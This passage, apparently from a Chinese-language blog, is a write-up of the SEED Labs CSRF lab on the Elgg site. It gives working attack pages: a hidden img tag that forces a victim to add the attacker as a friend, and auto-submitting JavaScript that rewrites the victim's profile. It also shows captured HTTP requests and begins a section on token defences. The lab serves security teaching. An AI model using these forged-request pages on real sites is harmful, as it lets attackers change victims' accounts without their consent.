+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154190.png" srcset="/img/loading.gif" lazyload alt="image-20251107174110201"></p>
+<p>我们（Samy）添加Alice为好友这一行为，实际就是发送了一个URL：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://www.seed-server.com/action/friends/<span class="hljs-keyword">add</span>?friend=56<span class="hljs-variable">&amp;__elgg_ts</span>=1762508247<span class="hljs-variable">&amp;__elgg_token</span>=hhSfLJgqJqES-IQJhkUfMQ<span class="hljs-variable">&amp;__elgg_ts</span>=1762508247<span class="hljs-variable">&amp;__elgg_token</span>=hhSfLJgqJqES-IQJhkUfMQ<br></code></pre></td></tr></table></figure>
+
+<p>题目描述提到：</p>
+<blockquote>
+<p>我们已经禁用了本实验中的防御措施，所以你不需要在伪造的请求中包括这两个参数(<code>__elgg_ts和__elgg_token</code>)</p>
+</blockquote>
+<p>所以这里我们就看这部分就可以了</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www.seed-server.com/action/friends/<span class="hljs-keyword">add</span>?friend=<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到，加好友用的HTTP方法为 <code>GET</code>，传了一个参数<code>?friend=56</code>,并且发送到了<code>/action/friends/add</code>路由。</p>
+<p>这里我们尝试理解一下，<code>friend=56</code>应该是Alice的用户ID，然后GET传递到<code>/action/friends/add</code>路由，添加ID为56的用户为好友，也就是添加Alice为好友</p>
+<p>那想让Alice加我们的话，只需要找到我们（Samy）的用户ID，然后让Alice访问：<code>http://www.seed-server.com/action/friends/add?friend=我们的用户ID</code></p>
+<p>我们先找自己的用户ID：回到members</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154111.png" srcset="/img/loading.gif" lazyload alt="image-20251107175919464"></p>
+<p>F12在查看器里看源代码，发现用户ID是硬编码到html里了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154536.png" srcset="/img/loading.gif" lazyload alt="image-20251107180054602"></p>
+<p>那我们自己的用户 id 为 59，所以Alice访问<code>http://www.seed-server.com/action/friends/add?friend=59</code>就可以加我们为好友</p>
+<p>题目是想让我们构建<a href="www.attacker32.com">www.attacker32.com</a>网页的内容，从而让Alice访问该网页时添加我们为好友</p>
+<blockquote>
+<p>提示：你可以使用 img标签，这将自动触发一个HTTP GET请求</p>
+</blockquote>
+<p>img是一个HTML标签，用来在网页上插入图片。</p>
+<p>就像写文章时会贴上一张照片，网页想显示图片时就写<code>&lt;img&gt;</code>这个标签，把图片的地址告诉它。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;图片地址&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;图片说明&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>src（source）：图片的地址，在网上或你电脑上的位置。</li>
+<li>alt（alternative text）：当图片无法显示时，用文字说明图片内容，或给视障人士阅读器用。</li>
+</ul>
+<p>比如查看这个网站图片的源代码，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154987.png" srcset="/img/loading.gif" lazyload alt="image-20251107181529903"></p>
+<p>会发现是一个img标签</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://www.seed-server.com/serve-file/e0/l1587929565/di/c0/RIFvmm_vS--I9Xb9mhiE_B0UtzlAC_Og-HwWQBq0A1c/1/59/profile/59small.jpg&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;Samy&quot;</span> <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;Samy&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>其中src是指source，所以<code>http://www.seed-server.com/serve-file/e0/l1587929565/di/c0/RIFvmm_vS--I9Xb9mhiE_B0UtzlAC_Og-HwWQBq0A1c/1/59/profile/59small.jpg</code>就是这张图片资源的URL。</p>
+<p>img标签有个好处就是加载页面的时候会自动加载，这样就能实现题目的要求：</p>
+<blockquote>
+<p>你的工作是在Alice访问网页时就使攻击成功，甚至不需要Alice在网页上进行任何点击。</p>
+</blockquote>
+<p>因为题目将宿主机上的目录Labsetup&#x2F;attacker挂载到容 器内的&#x2F;var&#x2F;www&#x2F;attacker，所以我们直接编辑Labsetup&#x2F;attacker即可</p>
+<p>修改Labsetup&#x2F;attacker&#x2F;addfriend.html：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154266.png" srcset="/img/loading.gif" lazyload alt="image-20251107194403087"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们用老版本的firefox登录Alice的账号，访问<a target="_blank" rel="noopener" href="http://www.attacker32.com/%EF%BC%8C%E5%B9%B6%E7%82%B9%E5%87%BB%60Add-Friend">http://www.attacker32.com/，并点击`Add-Friend</a> Attack&#96;链接</p>
+<blockquote>
+<p>这里新Firefox登录Samy，便于HTTP Header Live抓包；旧Firefox登录Alice账号，用以模拟Alice的行为。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154450.png" srcset="/img/loading.gif" lazyload alt="image-20251107194655954"></p>
+<p>返回members，点进samy，刷新，会发现成功添加samy为好友</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154327.png" srcset="/img/loading.gif" lazyload alt="image-20251107195348053"></p>
+<p>这里有个问题，就是上面我们使用老版本firefox做的，为什么不用最新版做呢？</p>
+<p>部分版本firefox其实是不能成功的，比如最新版，我们可以按F12看一下网络：</p>
+<p>当我们进行请求时，会发现访问<code>http://www.seed-server.com/</code>的包被拦截了，而且是跳转到了<code>/login</code>路由，并非我们写的<code>http://www.seed-server.com/action/friends/add?friend=59</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154318.png" srcset="/img/loading.gif" lazyload alt="image-20251107200855889"></p>
+<p>原理下面会提到</p>
+<h2 id="Task3：使用POST请求的CSRF攻击"><a href="#Task3：使用POST请求的CSRF攻击" class="headerlink" title="Task3：使用POST请求的CSRF攻击"></a>Task3：使用POST请求的CSRF攻击</h2><p>在把自己加入Alice的朋友名单后，Samy想进行更多的攻击。他想让Alice在她的个人资料中写 上”Samyis myHero”，使得所有人都能够看到。当然，Alice不喜欢Samy，更不用说把这个声明写进她的个人资料中。Samy计划使用CSRF攻击来实现这一目标，也就是这个Task的目标。</p>
+<p>攻击的一种方法是向Alice的Elgg账户发布一条信息，希望Alice会点击消息中的URL。这个URL会 把Alice 带到你（即Samy）的恶意网站<a target="_blank" rel="noopener" href="http://www.attacker32.com,在那里你可以发起csrf攻击./">www.attacker32.com，在那里你可以发起CSRF攻击。</a></p>
+<p>你的攻击目标是修改受害者的个人资料。详细说来，攻击者需要伪造一个请求来修改Elgg的受害者 用户的资料信息。允许用户修改他们的个人资料是 Elgg的一个功能。而当用户想修改他们的个人资料 时，他们进入Elgg的个人资料页面，填写一个表单，然后提交该表单，发送一个POST请求到服务器端的 脚本&#x2F;profile&#x2F;edit.php，该脚本处理请求并进行个人资料修改</p>
+<p>服务器端的脚本 edit.php同时接受GET和POST请求，所以你可以使用与Task1相同的技巧来实现 攻击。然而，这个任务中要求使用POST请求完成攻击。也就是说,当受害者正在访问他们的恶意网站时， 攻击者（你）需要从受害者的浏览器中伪造一个HTTPPOST请求。攻击者需要知道这种请求的结构。你 可以通过对个人资料进行一些修改，并使用”HTTP Header Live”工具监测请求的方式来观察请求的结构 （例如请求的参数等）。你可能会看到类似于下面的情况。与HTTPGET请求(将参数附加到URL字符串中) 不同的是，HTTPPOST请求的参数是包含在HTTP消息体中的（见两个符号之间的内容）。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/action/profile/edit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.seed-server.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) ...<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.seed-server.com/profile/elgguser1/edit<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Elgg=p0dci8baqrl4i2ipv2mio3po05<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>642<br><br><span class="language-1c">__elgg_token<span class="hljs-punctuation">=</span>fc98784a9fbd02b68682bbb0e75b428b</span><br><span class="language-1c"><span class="hljs-meta">&amp;__elgg_ts=1403464813</span></span><br><span class="language-1c"><span class="hljs-meta">&amp;name=elgguser1</span></span><br><span class="language-1c"><span class="hljs-meta">&amp;description=&lt;p&gt;I am elgguser1&lt;/p&gt;</span></span><br><span class="language-1c"><span class="hljs-meta">&amp;accesslevel[description]=2</span></span><br><span class="language-1c"><span class="hljs-meta">&amp;briefdescription=I am elgguser1</span></span><br><span class="language-1c"><span class="hljs-meta">&amp;accesslevel[briefdescription]=2</span></span><br><span class="language-1c"><span class="hljs-meta">&amp;location=US</span></span><br><span class="language-1c">......</span><br></code></pre></td></tr></table></figure>
+
+<p>在了解了请求的结构后，你需要从你的攻击性网页上使用JavaScript代码生成请求。为了帮助你编写 这样一个JavaScript程序，我们在下面中提供了一个示例代码。你可以使用这个示例代码来构建你的恶意 网站从而进行CSRF攻击。这只是一个示例代码，你需要修改它来使其适用于你的攻击。</p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&lt;html&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;This page forges an HTTP POST request.&lt;/h1&gt;<br>    &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">forge_POST</span><span class="hljs-params">()</span> &#123;</span><br>        var fields = <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-comment">// The following are form entries need to be filled out by attackers.</span><br>        <span class="hljs-comment">// The entries are made hidden, so the victim won&#x27;t be able to see them.</span><br>        fields += <span class="hljs-string">&quot;&lt;input type=&#x27;</span>hidden&#x27; name=<span class="hljs-string">&#x27;name&#x27;</span> value=<span class="hljs-string">&#x27;&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">        fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;briefdescription&#x27;</span> value=<span class="hljs-string">&#x27;&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">        fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;accesslevel[briefdescription]&#x27;</span> value=<span class="hljs-string">&#x27;2&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">        fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;guid&#x27;</span> value=<span class="hljs-string">&#x27;&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // Create a &lt;form&gt; element.</span><br><span class="hljs-string">        var p = document.createElement(&quot;</span>form<span class="hljs-string">&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // Construct the form</span><br><span class="hljs-string">        p.action = &quot;</span>http:<span class="hljs-comment">//www.example.com&quot;;</span><br>        p.innerHTML = fields;<br>        p.method = <span class="hljs-string">&quot;POST&quot;</span>;<br><br>        <span class="hljs-comment">// Append the form to the current page.</span><br>        document.body.appendChild(p);<br><br>        <span class="hljs-comment">// Submit the form</span><br>        p.submit();<br>      &#125;<br><br>      <span class="hljs-comment">// Invoke forge_POST() after the page is loaded.</span><br>      window.onload = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> &#123; <span class="hljs-title">forge_POST</span><span class="hljs-params">()</span>; &#125;</span><br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在行中，值2的含义是将一个字段的访问级别设置为public。如果没有设置这个值，则访问级别将 被默认设置为私有，那么其他人将无法看到这个字段。应该注意的是，当从PDF文件中复制和粘贴上述代码时，程序中的单引号字符可能会变成别的字符（但看起来仍然是单引号）。这将导致语法错误。将所 有的单引号符号替换为从键盘上输入的单引号符号就可以解决这些错误。</p>
+<p>和任务三差不多，其实就是改用POST传参</p>
+<p>首先我们看看修改个人资料是如何实现的：先找到修改个人资料的地方，修改后保存</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154109.png" srcset="/img/loading.gif" lazyload alt="image-20251107204516406"></p>
+<p>抓包如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/action/profile/edit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.seed-server.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----geckoformboundaryc87837412b065894eb0679530056e825<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2900<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://www.seed-server.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.seed-server.com/profile/samy/edit<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Elgg=ae5tjk6hto0kk68rn5i53srapj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-dts">__elgg_<span class="hljs-attr">token</span><span class="hljs-operator">=</span>k1jizUuM145x-zYmPx9uKw<span class="hljs-variable">&amp;__elgg_ts</span>=<span class="hljs-number">1762518439</span><span class="hljs-variable">&amp;name</span>=Samy<span class="hljs-variable">&amp;description</span>=<span class="hljs-params">&lt;p&gt;</span><span class="hljs-number">111</span><span class="hljs-params">&lt;/p&gt;</span> <span class="hljs-variable">&amp;accesslevel</span>[description]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;briefdescription</span>=<span class="hljs-variable">&amp;accesslevel</span>[briefdescription]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;location</span>=<span class="hljs-variable">&amp;accesslevel</span>[location]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;interests</span>=<span class="hljs-variable">&amp;accesslevel</span>[interests]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;skills</span>=<span class="hljs-variable">&amp;accesslevel</span>[skills]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;contactemail</span>=<span class="hljs-variable">&amp;accesslevel</span>[contactemail]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;phone</span>=<span class="hljs-variable">&amp;accesslevel</span>[phone]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;mobile</span>=<span class="hljs-variable">&amp;accesslevel</span>[mobile]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;website</span>=<span class="hljs-variable">&amp;accesslevel</span>[website]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;twitter</span>=<span class="hljs-variable">&amp;accesslevel</span>[twitter]=<span class="hljs-number">2</span><span class="hljs-variable">&amp;guid</span>=<span class="hljs-number">59</span></span><br></code></pre></td></tr></table></figure>
+
+<p>接口是<code>/action/profile/edit</code>，参数很多</p>
+<p>然后我们补充上面攻击代码，实现攻击，其实补充下面几个部分就行</p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scilab">......<br>    fields += <span class="hljs-string">&quot;&lt;input type=&#x27;</span>hidden&#x27; name=<span class="hljs-string">&#x27;name&#x27;</span> value=<span class="hljs-string">&#x27;Alice&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">    fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;briefdescription&#x27;</span> value=<span class="hljs-string">&#x27;Samy is my hero&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">    fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;accesslevel[briefdescription]&#x27;</span> value=<span class="hljs-string">&#x27;2&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">    fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;guid&#x27;</span> value=<span class="hljs-string">&#x27;56&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">......</span><br><span class="hljs-string">        p.action = &quot;</span>http:<span class="hljs-comment">//www.seed-server.com/action/profile/edit&quot;;</span><br>......<br></code></pre></td></tr></table></figure>
+
+<p>编辑 <code>editprofile.html</code>即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154222.png" srcset="/img/loading.gif" lazyload alt="image-20251107205500834"></p>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&lt;html&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;This page forges an HTTP POST request.&lt;/h1&gt;<br>    &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">forge_POST</span><span class="hljs-params">()</span> &#123;</span><br>        var fields = <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-comment">// The following are form entries need to be filled out by attackers.</span><br>        <span class="hljs-comment">// The entries are made hidden, so the victim won&#x27;t be able to see them.</span><br>        fields += <span class="hljs-string">&quot;&lt;input type=&#x27;</span>hidden&#x27; name=<span class="hljs-string">&#x27;name&#x27;</span> value=<span class="hljs-string">&#x27;Alice&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">        fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;briefdescription&#x27;</span> value=<span class="hljs-string">&#x27;Samy is my hero&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">        fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;accesslevel[briefdescription]&#x27;</span> value=<span class="hljs-string">&#x27;2&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">        fields += &quot;</span>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> name=<span class="hljs-string">&#x27;guid&#x27;</span> value=<span class="hljs-string">&#x27;56&#x27;</span>&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // Create a &lt;form&gt; element.</span><br><span class="hljs-string">        var p = document.createElement(&quot;</span>form<span class="hljs-string">&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // Construct the form</span><br><span class="hljs-string">        p.action = &quot;</span>http:<span class="hljs-comment">//www.seed-server.com/action/profile/edit&quot;;</span><br>        p.innerHTML = fields;<br>        p.method = <span class="hljs-string">&quot;POST&quot;</span>;<br><br>        <span class="hljs-comment">// Append the form to the current page.</span><br>        document.body.appendChild(p);<br><br>        <span class="hljs-comment">// Submit the form</span><br>        p.submit();<br>      &#125;<br><br>      <span class="hljs-comment">// Invoke forge_POST() after the page is loaded.</span><br>      window.onload = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span> &#123; <span class="hljs-title">forge_POST</span><span class="hljs-params">()</span>; &#125;</span><br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>修改完之后，我们发送消息</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155052.png" srcset="/img/loading.gif" lazyload alt="image-20251107210511316"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.attacker32.com/editprofile.html<br></code></pre></td></tr></table></figure>
+
+<p>还是用旧Firefox登录Alice账号，查看消息，点击链接</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155027.png" srcset="/img/loading.gif" lazyload alt="image-20251107210816860"></p>
+<p>跳转，显示修改成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155803.png" srcset="/img/loading.gif" lazyload alt="image-20251107211002634"></p>
+<p><strong>问题</strong> 除了详细描述你的攻击外，你还需要在实验报告中回答如下问题：</p>
+<ul>
+<li><p>问题1: 伪造的HTTP请求需要Alice的用户ID（guid）才能正常工作。如果Boby专门针对Alice做 攻击准备，他可以找到方法来获得Alice的用户ID。Boby不知道Alice的Elgg口令，所以他不能登录到Alice的账户来获取信息。请描述Boby如何解决这个问题。</p>
+<p>我们task2就已经解决了这个问题，用户ID是硬编码到html里</p>
+</li>
+<li><p>问题2: 如果Boby想向任何访问他的恶意网页的人发动攻击。在这种情况下，他事先不知道谁在访 问该网页。那么他还能发动CSRF攻击来修改受害者的Elgg资料吗？请解释原因。</p>
+<p>不能，没有guid的话不能大规模攻击，只能针对性攻击</p>
+</li>
+</ul>
+<h2 id="Task4：开启Elgg的防御措施"><a href="#Task4：开启Elgg的防御措施" class="headerlink" title="Task4：开启Elgg的防御措施"></a>Task4：开启Elgg的防御措施</h2><p>CSRF并不难防御。最初，大部分应用都在页面中嵌入了秘密令牌（secrettoken），通过确认请求中是 否包含秘密令牌，这些应用可以分辨一个请求是同站请求还是跨站请求。这个方法被称为秘密令牌方法。 再后来，大部分浏览器都实现了一种叫做同站cookie（SameSitecookie）的机制，目的是为了简化CSRF 防御方法的实现。我们将对这两种方式进行实验。</p>
+<p>为了防御CSRF攻击，Web应用程序可以在其页面中嵌入一个秘密令牌。所有来自页面的请求必须携 带这个令牌，否则它们将被视为跨站请求，和同站请求所拥有的权限不同。攻击者将无法得到这个秘密令 牌，所以他们的请求很容易被识别为跨站请求。</p>
+<p>Elgg 使用这种秘密令牌方法作为其内置的措施来防御CSRF攻击。我们已经禁用了这些防御措施，因 此之前攻击能够成功。Elgg在请求中嵌入了两个参数 __elgg_ts和 __elgg_token。这两个参数被添加 到POST请求的HTTP消息体，以及HTTPGET请求的URL字符串中。服务器在处理一个请求之前将会先 验证这两个字段。</p>
+<p>在网页内嵌入秘密令牌和时间戳 Elgg在所有的HTTP请求中添加了秘密令牌和时间戳。以下HTML代码 将会出现在所有需要用户操作的表单中。这两个字段是隐藏字段；当表单被提交时，这两个隐藏的参数会 被添加到请求中。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hidden&quot;</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;__elgg_ts&quot;</span> value <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span> /&gt;<br>&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hidden&quot;</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;__elgg_token&quot;</span> value <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>
+
+<p>同时Elgg将秘密令牌和时间戳的值赋值给JavaScript变量，因此它们可以很容易地被同一页面上的 JavaScript 代码获得。</p>
